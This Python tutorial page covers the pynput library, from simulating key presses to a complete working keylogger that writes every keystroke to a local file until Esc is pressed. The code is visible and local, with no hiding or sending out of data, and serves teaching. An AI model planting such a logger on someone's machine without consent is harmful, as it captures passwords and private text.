@@ -1,0 +1,502 @@
+
+
+
+
+next →
+← prev
+
+Creating a Keylogger using Python
+Keyloggers are a type of monitoring software utilized to record keystrokes made by the user with their keyboard. They are generally utilized to monitor the network utilization along with troubleshooting the technical errors. On the contrary, a lot of malicious software utilizes keyloggers in the attempt to retrieve usernames and passwords for different websites.
+In the following tutorial, we will understand how to make a simple keylogger using the pynput library in the Python programming language.
+So, let's get started.
+Understanding the Python pynput library
+The pynput library in Python enables the programmers to control and monitor input devices. This library consists of sub-packages for each type of input device supported:
+
+mouse: This sub-package consists of the classes to control and monitor a mouse or trackpad.
+keyboard: This sub-package consists of the classes to control and monitor the keyboard.
+
+In order to install the Python library, we need 'pip', a framework to maintain packages required to install the modules from the trusted public repositories. Once we have 'pip', we can install the pynput library using the command from a command prompt (CMD) or terminal as shown below:
+Syntax:
+
+$ pip install pynput
+
+All the modules mentioned previously are automatically imported into the pynput package. We can use any of them by simply importing them from the main package. Once the pynput package is installed, we can verify it by creating an empty Python program file and writing an import statement as follows:
+File: verify.py
+
+# importing different modules from the pynput library
+from pynput import keyboard, mouse
+
+Now, save the above file and execute it using the following command in a terminal:
+Syntax:
+
+$ python verify.py
+
+If the above Python program file does not return any error, the library is installed properly. However, in the case where an exception is raised, try reinstalling the library, and it is also recommended to refer to the official documentation of the library.
+In the following tutorial, we will only discuss the keyboard module of the pynput library that will serve the purpose of creating a simple keylogger.
+But first, let us understand some basics.
+Pressing and Releasing Keyboards keys using Python
+The first thing we will learn is to control the keyboard with the help of Python and especially the method of pressing keys on the keyboard.
+There are two types of keys that we should be concerned about:
+
+Regular Keys - These keys include letters, numbers, and signs.
+Special Keys - These keys include space, shift, ctrl, and many more.
+
+In order to start controlling the keyboard, we have to create an object of the Controller() class which will have the press() and release() methods. This class sends the keyboard events to the system.
+Let us now consider a simple example demonstrating the same:
+Example 1:
+
+# importing different modules from the pynput library
+from pynput.keyboard import Controller
+
+# instantiating the Controller class
+the_keyboard = Controller()
+
+# using the press() and release() methods
+the_keyboard.press('x')
+the_keyboard.release('x')
+
+Explanation:
+In the above snippet of code, we have imported the Controller() class from the keyboard module of the pynput library. We have then created an object of the Controller() class. We have then used the press() and release() methods in order to type a letter. As a result, the above code will type "x" wherever the mouse cursor is located. It is also designed to press and release one key at a time.
+The output of the above snippet of code will look like the following:
+Output:
+$ python example1.py
+$ x
+
+Moreover, we can also press and release multiple keys. Let us consider the following example demonstrating the same:
+Example 2:
+
+# importing different modules from the pynput library
+from pynput.keyboard import Controller
+
+# instantiating the Controller class
+the_keyboard = Controller()
+
+# using the press() and release() methods
+the_keyboard.press('x')
+the_keyboard.release('x')
+the_keyboard.press('y')
+the_keyboard.release('y')
+the_keyboard.press('z')
+the_keyboard.release('z')
+
+Explanation:
+In the above snippet of code, we have now pressed and released multiple keys. As a result, we will see 'xyz' as an output.
+The output of the above snippet of code is shown below:
+Output:
+$ python example2.py
+$ xyz
+
+Now, let us understand the way of handling special keys. Suppose we want to press "x y" (x, space, y).
+Special keys like space are called with the help of the Key class from the pynput library.
+The Key class represents different buttons that may not correspond to letters. This class consists of modifier keys and function keys.
+A complete list of all special keys is available in the following table. The actual values for these entities differ between platforms. Some platforms may consist of additional buttons; however, these are guaranteed to be available everywhere.
+
+
+S. No.
+Keys
+Description
+
+
+1
+alt = 0
+This is a generic Alt key. This is considered a modifier.
+
+
+2
+alt_gr = 0
+This is the AltGr key. This is considered a modifier.
+
+
+3
+alt_l = 0
+This is the left Alt key. This is considered a modifier.
+
+
+4
+alt_r = 0
+This is the right Alt key. This is considered a modifier.
+
+
+5
+backspace = 0
+This is the Backspace key.
+
+
+6
+caps_lock = 0
+This is the Caps Lock key.
+
+
+7
+cmd = 0
+This is a generic command button. On PC platforms, this button corresponds to the Super key or Windows key, and on Mac, it corresponds to the Command key. This may be considered a modifier.
+
+
+8
+cmd_l = 0
+This is the left command button. On PC platforms, this button corresponds to the Super key or Windows key, and on Mac, it corresponds to the Command key. This may be considered a modifier.
+
+
+9
+cmd_r = 0
+This is the right command button. On PC platforms, this button corresponds to the Super key or Windows key, and on Mac, it corresponds to the Command key. This may be considered a modifier.
+
+
+10
+ctrl = 0
+This is a generic Ctrl key. This is considered a modifier.
+
+
+11
+ctrl_l = 0
+This is the left Ctrl key. This is considered a modifier.
+
+
+12
+ctrl_r = 0
+This is the right Ctrl key. This is considered a modifier.
+
+
+13
+delete = 0
+This is the delete key.
+
+
+14
+down = 0
+This is a down arrow key.
+
+
+15
+end = 0
+This is the End key.
+
+
+16
+enter = 0
+This is the Enter or Return key.
+
+
+17
+esc = 0
+This is the Esc key.
+
+
+18
+f1 = 0
+This is the function key. All the keys ranging from F1 to F20 are defined.
+
+
+19
+home = 0
+This is the Home key.
+
+
+20
+insert = 0
+This is the Insert key. This may be considered undefined for some platforms.
+
+
+21
+left = 0
+This is a left arrow key.
+
+
+22
+media_next = 0
+This is the next track button.
+
+
+23
+media_play_pause = 0
+This is the play/pause toggle button.
+
+
+24
+media_previous = 0
+This is the previous track button.
+
+
+25
+media_volume_down = 0
+This is the volume down button.
+
+
+26
+media_volume_mute = 0
+This is the volume mute button.
+
+
+27
+media_volume_up = 0
+This is the volume up button.
+
+
+28
+menu = 0
+This is the Menu key. This may be considered undefined for some platforms.
+
+
+29
+num_lock = 0
+This is the Num Lock key. This may be considered undefined for some platforms.
+
+
+30
+page_down = 0
+This is the Page Down key.
+
+
+31
+page_up = 0
+This is the Page Up key.
+
+
+32
+pause = 0
+This is the Pause/Break key. This may be considered undefined for some platforms.
+
+
+33
+print_screen = 0
+This is the Print Screen key. This may be considered undefined for some platforms.
+
+
+34
+right = 0
+This is a right arrow key.
+
+
+35
+scroll_lock = 0
+This is the Scroll Lock key. This may be considered undefined for some platforms.
+
+
+36
+shift = 0
+This is a generic Shift key. This is considered a modifier.
+
+
+37
+shift_l = 0
+This is the left Shift key. This is considered a modifier.
+
+
+38
+shift_r = 0
+This is the right Shift key. This is considered a modifier.
+
+
+39
+space = 0
+This is the Space key.
+
+
+40
+tab = 0
+This is the Tab key.
+
+
+41
+up = 0
+This is an up arrow key.
+
+
+Let us now consider the following example demonstrating the use of these special keys.
+Example 3:
+
+# importing different modules from the pynput library
+from pynput.keyboard import Key, Controller
+
+# instantiating the Controller class
+the_keyboard = Controller()
+
+# using the press() and release() methods
+the_keyboard.press('x')
+the_keyboard.release('x')
+the_keyboard.press(Key.space)
+the_keyboard.release(Key.space)
+the_keyboard.press('y')
+the_keyboard.release('y')
+
+Output:
+$ python example3.py
+$ x y
+
+In the above snippet of code, we have imported the Key and Controller classes from the pynput.keyboard module. We instantiated the Controller class and used the press() and release() methods to type some letters. We have also used the space key with the help of the Key class and printed the space between the two letters - x and y.
+The above method works for the special keys that we press and release. For example, space, enter, and many more. However, how would we deal with the keys we pressed while typing? Let us take an example of the Shift key, and the objective is to press "Xy" (capital X, y).
+In order to perform such functionality, the Controller() class offers a useful method known as pressed(). Let us consider the following example demonstrating the same:
+Example 4:
+
+# importing different modules from the pynput library
+from pynput.keyboard import Key, Controller
+
+# instantiating the Controller class
+the_keyboard = Controller()
+
+# using the press() and release() methods
+with the_keyboard.pressed(Key.shift):
+    the_keyboard.press('x')
+    the_keyboard.release('x')
+the_keyboard.press('y')
+the_keyboard.release('y')
+
+Output:
+$ python example4.py
+$ Xy
+
+Explanation:
+In the above snippet of code, we have imported the Key and Controller classes from the pynput.keyboard module. We instantiated the Controller class and used the pressed() method specifying the shift key from the Key class in the with statement. We have used the press() and release() to type the letter 'x' within this statement. We have again used the press() and release() and typed the letter 'y' as it is.
+There are different combinations of keys available for one to try as per their requirements. One can configure the code as per their needs; however, this is a general overview of how the press and release logic works to control the keyboard.
+Creating a sample log file
+Let us now create a sample log file to store the keys that we press recorded by the keylogger.
+We can create a sample file and integrate it into the keylogging process.
+The following snippet of code demonstrates the same:
+Example 5:
+
+with open("keylog.txt", "w") as log:
+    log.write("This is a log file.")
+
+Explanation:
+In the above snippet of code, we have used the open() method to create a new file as "keylog.txt" in the with statement. We have then used the write() method to write some text in this log file.
+Once we execute the above code, we will get a keylog.txt file containing the text: This is a log file. We would like Python to record the keys that we press and add them to this file in the following.
+Creating a simple keylogger using Python
+We know how to create a log file with some sample text. We want Python to write the keys we press and store them into this file (rather than having the same text there).
+So, let us first consider theoretically what we want to perform? We need a list that will keep appending keys that we pressed on the keyboard. And then, once a key is pressed, it will write this list to a file.
+Let us understand the working of the above statement with the help of the following snippet of code.
+File: keylogger.py
+
+# importing the required modules
+from pynput.keyboard import Key
+
+# creating an empty list to store pressed keys
+the_keys = []
+# creating a function that defines what to do on each key press
+def functionPerKey(key):
+# appending each pressed key to a list
+    the_keys.append(key)
+# writing list to file after each key pressed
+    storeKeysToFile(the_keys)
+
+Explanation:
+In the above snippet of code, we have imported the Key class from the keyboard module of the pynput library. We have then created an empty list in order to store the pressed keys. We have then defined a function as functionPerKey() that provides instructions to perform when a key is pressed. We have used the append() function to append each pressed key to a list within this function. We called another function as storeKeysToFile() to write a list to file after each key was pressed. However, this function is still required to be defined.
+Remember that the key we pressed comes in the "key" format, and for us to write it to a file, we must have it as a String. Moreover, we will require to remove 'quotation' marks from each key since each key is a string, and we want to join them together.
+Let us now consider the following snippet of code where we will define another function that will write the keys to the file.
+File: keylogger.py
+
+# defining the function to write keys to the log file
+def storeKeysToFile(keys):
+    # creating the keylog.txt file with write mode
+    with open('keylog.txt', 'w') as log:
+        # looping through each key present in the list of keys
+        for the_key in keys:
+            # converting the key to string and removing the quotation marks
+            the_key = str(the_key).replace("'", "")
+            # writing each key to the keylog.txt file
+            log.write(the_key)
+
+Explanation:
+In the above snippet of code, we have defined a custom function as storeKeysToFile() that accepts a key as its parameter. Within this function, we have used the created the keylog.txt file with write mode with the help of the open() method. We have then used the for-loop to iterate through each key present in the list of keys and converted them into strings removing the quotation marks. We then wrote each key to the keylog.txt file using the write() method.
+As a result, whenever a key is pressed, Python will create a keylog.txt file with the list of keys pressed from the time the script began running up to the last key pressed.
+If we leave the code like it, it will keep executing all the time. We will define a function consisting of some stop key or a combination of keys that will stop the key logger. Let us consider "Esc" as the stop key for this program. Now we will jump into its implementation.
+As we already know, whenever we press "Esc", it will be added to the keylog.txt file. Thus, we will define an operation that must take place once we release the "Esc" key after pressing it.
+Let us now consider the following snippet of code demonstrating such a function's implementation.
+File: keylogger.py
+
+# defining the function to perform operation on each key release
+def onEachKeyRelease(the_key):
+    # In case, the key is "Esc" then stopping the keylogger
+    if the_key == Key.esc:
+        return False
+
+Explanation:
+In the above snippet of code, we have defined a function to operate on each key release. Within this function, we have used the if conditional statement to check if the released key is "Esc" and return False for the same.
+As the final step, we will require putting together everything and getting the keylogger running.
+We will require a listening object to run the keylogger. This object will record the keyboard events. We will be using the Listener() class from the keyboard module of the pynput library to perform this operation.
+The Listener() class has different arguments; however, we will require only two of them. These arguments are briefly described below:
+
+on_press - This argument calls the function to perform when a key is pressed.
+on_release - This argument calls the function to perform when a key is released.
+
+We will now assign the above custom functions as the Listener() class parameters so that we can join each pressed key with each other.
+Let us now consider the following snippet of code that demonstrates the implementation of the above statement.
+File: keylogger.py
+
+from pynput.keyboard import Listener
+
+with Listener(
+    on_press = functionPerKey,
+    on_release = onEachKeyRelease
+) as the_listener:
+    the_listener.join()
+
+Explanation:
+In the above snippet of code, we have imported the snippet of code, and we have imported the Listener() class from the keyboard module of the pynput library. We have then used the Listener() class specifying the parameters as on_press = functionPerKey and on_release = onEachKeyRelease. At last, we have joined these specified functions using the join() method.
+The coding of the 'Python Keylogger' program is finally completed. We can now save the file and run the program to see if it works.
+To run the program, we can type the following command in the command-line shell or terminal:
+Command:
+
+$ python keylogger.py
+
+But before we see the output, here is a complete project code.
+The Complete Program Code
+The following program file is a complete code for the 'Python Keylogger' program.
+File: keylogger.py
+
+# importing the required modules
+from pynput.keyboard import Key
+from pynput.keyboard import Listener
+
+# creating an empty list to store pressed keys
+the_keys = []
+# creating a function that defines what to do on each key press
+def functionPerKey(key):
+# appending each pressed key to a list
+    the_keys.append(key)
+# writing list to file after each key pressed
+    storeKeysToFile(the_keys)
+
+# defining the function to write keys to the log file
+def storeKeysToFile(keys):
+    # creating the keylog.txt file with write mode
+    with open('keylog.txt', 'w') as log:
+        # looping through each key present in the list of keys
+        for the_key in keys:
+            # converting the key to string and removing the quotation marks
+            the_key = str(the_key).replace("'", "")
+            # writing each key to the keylog.txt file
+            log.write(the_key)
+
+# defining the function to perform operation on each key release
+def onEachKeyRelease(the_key):
+    # In case, the key is "Esc" then stopping the keylogger
+    if the_key == Key.esc:
+        return False
+
+with Listener(
+    on_press = functionPerKey,
+    on_release = onEachKeyRelease
+) as the_listener:
+    the_listener.join()
+
+Output:
+$ python keylogger.py
+# type something and press enter to print something on Command prompt
+$ This is a simple keylogger program.
+# press "Esc" key to stop the keylogger
+
+Output in 'keylog.txt' file:
+
+
+
+Next TopicQuandl package in Python
+
+
+
+
+← prev
+next →
+
+
+
+
